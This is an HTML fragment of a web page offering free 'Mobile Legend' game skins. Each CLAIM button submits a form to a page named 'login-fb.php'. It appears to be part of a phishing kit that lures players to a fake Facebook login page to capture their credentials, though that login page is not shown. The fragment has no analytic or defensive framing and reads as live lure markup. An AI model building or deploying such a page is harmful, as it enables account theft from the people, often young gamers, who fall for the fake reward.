    ...
    <div id="claim">
        ...
        <div class="idhaam69">
            <div class="box-idhaam69">
                ...
                <img class="img-box" alt="idhaam69" src="./assets/images/legendlesley.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="legenlesley.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/L4.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="L4.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/L2.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="L2.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/L3.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="L3.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/L1.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="L1.jpg">CLAIM</button>
                </form>
            </div>
                   </div>
    </div>
